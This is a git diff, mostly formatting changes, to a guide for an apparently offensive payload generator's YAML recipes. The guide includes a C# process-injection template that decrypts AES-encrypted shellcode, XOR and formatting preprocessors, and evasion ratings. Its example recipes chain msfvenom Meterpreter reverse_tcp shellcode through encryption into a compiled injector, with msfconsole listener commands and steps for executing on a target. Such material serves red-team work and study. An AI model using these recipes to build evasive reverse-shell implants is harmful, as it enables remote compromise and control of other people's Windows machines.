@@ -22,30 +22,30 @@ This guide provides context and examples for generating paygen recipes, preproce
 All recipes are YAML files with 4 main sections:
 
 ```yaml
-meta:           # Metadata about the payload
-parameters:     # User-configurable parameters
-preprocessing:  # Optional data transformation steps
-output:         # How to generate the final payload
+meta: # Metadata about the payload
+parameters: # User-configurable parameters
+preprocessing: # Optional data transformation steps
+output: # How to generate the final payload
 ```
 
 ### Meta Section
 
 ```yaml
 meta:
-  name: "Recipe Name"                    # Display name in TUI
-  category: "Category Name"              # Groups recipes (e.g., "Process Injection", "Shellcode Generation")
-  description: |                         # Multi-line description
+  name: "Recipe Name" # Display name in TUI
+  category: "Category Name" # Groups recipes (e.g., "Process Injection", "Shellcode Generation")
+  description: | # Multi-line description
     What this payload does
     How it works
     Any important notes
-  
-  effectiveness: high|medium|low         # Evasion rating
-  
-  mitre:                                 # MITRE ATT&CK mappings
+
+  effectiveness: high|medium|low # Evasion rating
+
+  mitre: # MITRE ATT&CK mappings
     tactic: "TA0XXX - Tactic Name"
     technique: "T1XXX - Technique Name"
-  
-  artifacts:                             # Observable indicators
+
+  artifacts: # Observable indicators
     - "Network connection to C2"
     - "File creation in temp directory"
 ```
@@ -58,10 +58,10 @@ parameters:
     type: "ip|port|string|path|hex|integer|bool|choice"
     description: "What this parameter does"
     required: true|false
-    default: "value"                     # Optional default
-    choices: ["opt1", "opt2"]           # For type: choice
-    min: 1                               # For type: integer
-    max: 65535                           # For type: integer
+    default: "value" # Optional default
+    choices: ["opt1", "opt2"] # For type: choice
+    min: 1 # For type: integer
+    max: 65535 # For type: integer
 ```
 
 ### Output Section
@@ -69,10 +69,11 @@ parameters:
 Two types: `template` or `command`
 
 **Template-based:**
+
 ```yaml
 output:
   type: "template"
-  template: "path/to/template.cs"      # Relative to templates_dir
+  template: "path/to/template.cs" # Relative to templates_dir
   compile:
     enabled: true
     command: "mcs -out:{{ output_path }}/{{ output_file }} {{ source_file }}"
@@ -81,6 +82,7 @@ output:
 ```
 
 **Command-based:**
+
 ```yaml
 output:
   type: "command"
@@ -96,6 +98,7 @@ output:
 ### 1. Template-Based Recipes
 
 Use Jinja2 templates for source code generation. Best for:
+
 - Custom C/C++/C# payloads
 - PowerShell scripts
 - Python scripts
@@ -106,6 +109,7 @@ Use Jinja2 templates for source code generation. Best for:
 ### 2. Command-Based Recipes
 
 Execute external commands (msfvenom, shellcode generators, etc.). Best for:
+
 - Wrapper around existing tools
 - Pre-compiled payloads
 - Binary transformations
@@ -115,36 +119,44 @@ Execute external commands (msfvenom, shellcode generators, etc.). Best for:
 ## Parameter Types
 
 ### `ip`
+
 - Validates IPv4 addresses
 - Example: `192.168.1.100`
 
 ### `port`
+
 - Validates port numbers (1-65535)
 - Example: `4444`
 
 ### `string`
+
 - Any text value
 - Example: `MyPayload`
 
 ### `path`
+
 - File or directory path
 - Can use config variables: `{config.output_dir}`
 - Example: `/tmp/output`
 
 ### `hex`
+
 - Hexadecimal values
 - Example: `0xdeadbeef` or `fa12`
 
 ### `integer`
+
 - Whole numbers
 - Can specify `min` and `max`
 - Example: `1024`
 
 ### `bool`
+
 - Boolean checkbox
 - Values: `true` or `false`
 
 ### `choice`
+
 - Dropdown selection
 - Requires `choices` array
 - Example:
@@ -198,14 +210,14 @@ preprocessing:
     name: "step1"
     command: "generate_data"
     output_var: "raw_data"
-  
+
   - type: "script"
     name: "step2"
     script: "transform.py"
     args:
       data: "{{ raw_data }}"
     output_var: "transformed_data"
-  
+
   - type: "script"
     name: "step3"
     script: "format_csharp.py"
@@ -241,20 +253,20 @@ class Injector {
     static byte[] encrypted = { {{ encrypted_shellcode }} };
     static byte[] key = { {{ aes_key }} };
     static byte[] iv = { {{ aes_iv }} };
-    
+
     // Windows API imports for process injection
     [DllImport("kernel32.dll")]
     static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
-    
+
     static void Main(string[] args) {
         // Decrypt shellcode using AES-256-CBC
         byte[] shellcode = AesDecrypt(encrypted, key, iv);
-        
+
         // Inject into {{ target_process }}
         // Implementation uses classic DLL injection technique
         // ... injection code ...
     }
-    
+
     // AES decryption routine
     // Implements standard AES-256-CBC decryption
     static byte[] AesDecrypt(byte[] data, byte[] key, byte[] iv) {
@@ -325,21 +337,21 @@ import base64
 def main():
     # Read arguments from stdin
     args = json.load(sys.stdin)
-    
+
     # Get data (base64 encoded) and key
     data = base64.b64decode(args['data'])
     key = int(args.get('key', 0xFA), 16)
-    
+
     # XOR encrypt
     encrypted = bytes([b ^ key for b in data])
-    
+
     # Return results
     output = {
         'encrypted': base64.b64encode(encrypted).decode(),
         'key': hex(key),
         'size': len(encrypted)
     }
-    
+
     print(json.dumps(output))
 
 if __name__ == "__main__":
@@ -358,15 +370,15 @@ import base64
 def main():
     args = json.load(sys.stdin)
     data = base64.b64decode(args['data'])
-    
+
     # Format as C# byte array
     formatted = ", ".join([f"0x{b:02x}" for b in data])
-    
+
     output = {
         'formatted': formatted,
         'length': len(data)
     }
-    
+
     print(json.dumps(output))
 
 if __name__ == "__main__":
@@ -376,6 +388,7 @@ if __name__ == "__main__":
 ### Built-in Preprocessors
 
 Available in `preprocessors/`:
+
 - `xor_encrypt.py` - XOR encryption with auto-key generation
 - `aes_encrypt.py` - AES-256-CBC encryption
 - `base64_encode.py` - Base64 encoding
@@ -412,23 +425,23 @@ parameters:
     type: "ip"
     description: "Attacker IP address"
     required: true
-  
+
   - name: "lport"
     type: "port"
     description: "Listener port"
     required: true
     default: 4444
-  
+
   - name: "target_process"
     type: "string"
     description: "Target process name"
     required: true
     default: "explorer.exe"
-  
+
   - name: "output_file"
     type: "string"
     default: "injector.exe"
-  
+
   - name: "output_path"
     type: "path"
     default: "{config.output_dir}"
@@ -438,28 +451,28 @@ preprocessing:
     name: "generate_shellcode"
     command: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{ lhost }} LPORT={{ lport }} -f raw"
     output_var: "shellcode"
-  
+
   - type: "script"
     name: "aes_encryption"
     script: "aes_encrypt.py"
     args:
       data: "{{ shellcode }}"
     output_var: "encrypted"
-  
+
   - type: "script"
     name: "format_encrypted_payload"
     script: "format_csharp.py"
     args:
       data: "{{ encrypted.encrypted }}"
     output_var: "encrypted_shellcode"
-  
+
   - type: "script"
     name: "format_aes_key"
     script: "format_csharp.py"
     args:
       data: "{{ encrypted.key }}"
     output_var: "aes_key"
-  
+
   - type: "script"
     name: "format_aes_iv"
     script: "format_csharp.py"
@@ -476,7 +489,7 @@ output:
   launch_instructions: |
     # Step 1: Start Metasploit listener
     msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; exploit"
-    
+
     # Step 2: Execute on target
     {{ output_path }}/{{ output_file }} {{ target_process }}
 ```
@@ -502,15 +515,15 @@ parameters:
   - name: "lhost"
     type: "ip"
     required: true
-  
+
   - name: "lport"
     type: "port"
     default: 4444
-  
+
   - name: "output_file"
     type: "string"
     default: "payload.exe"
-  
+
   - name: "output_path"
     type: "path"
     default: "{config.output_dir}"
@@ -523,7 +536,7 @@ output:
   launch_instructions: |
     # Start listener
     msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; exploit"
-    
+
     # Execute payload
     {{ output_path }}/{{ output_file }}
 ```
@@ -599,7 +612,7 @@ msfvenom → encrypt → format → template → compile
 ### Pattern 2: Multi-stage Loader
 
 ```
-generate stager → encrypt stager → 
+generate stager → encrypt stager →
 generate stage2 → encrypt stage2 →
 combine → template → compile
 ```
@@ -636,6 +649,7 @@ command tool → output file
 ### Preprocessing Variables
 
 Available after their step completes:
+
 - `{{ output_var_name }}` - Full output (string or dict)
 - `{{ output_var_name.key }}` - If output is JSON dict
 - `{{ output_var_name.formatted }}` - Common pattern from formatters
@@ -643,6 +657,7 @@ Available after their step completes:
 ### Compilation Variables
 
 Only in `compile.command`:
+
 - `{{ source_file }}` - Path to rendered template
 
 ---
@@ -650,23 +665,27 @@ Only in `compile.command`:
 ## Troubleshooting
 
 ### Recipe won't load
+
 - Check YAML syntax (use yamllint)
 - Verify all required fields present
 - Check parameter types are valid
 
 ### Preprocessing fails
+
 - Test preprocessor script independently
 - Check JSON input/output format
 - Verify base64 encoding for binary data
 - Check that previous `output_var` exists
 
 ### Template rendering fails
+
 - Verify all variables are defined
 - Check Jinja2 syntax
 - Escape special characters properly
 - Test with simple template first
 
 ### Compilation fails
+
 - Check compiler is installed
 - Verify command syntax
 - Test command manually with rendered code
